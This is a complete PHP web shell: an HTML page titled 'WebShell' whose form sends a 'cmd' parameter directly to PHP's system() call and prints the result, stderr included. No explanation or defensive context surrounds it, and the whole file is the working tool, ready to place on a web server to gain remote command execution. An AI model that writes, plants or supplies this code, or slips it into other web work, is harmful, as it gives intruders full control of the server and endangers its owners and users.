<html>
  <body>
    <h3>WebShell</h3>
    <form method="GET">
      <input type="TEXT" name="cmd" id="cmd" size="80">
      <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd'] . ' 2>&1');
}
?>
    </pre>
  </body>
</html>
